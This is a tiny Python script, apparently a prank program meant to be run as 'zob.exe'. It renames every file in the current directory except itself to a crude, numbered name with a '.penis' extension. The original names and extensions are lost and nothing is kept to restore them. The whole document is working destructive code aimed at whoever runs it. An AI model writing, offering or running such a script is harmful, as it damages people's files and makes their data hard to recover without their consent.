import glob
import os

fileList = glob.glob(r'*')
try:
	fileList.remove('zob.exe')
except:
	fileList.remove('zob.py')

count = 0

for files in fileList:
	count+=1
	os.rename(files, 'penis%d.penis' %count)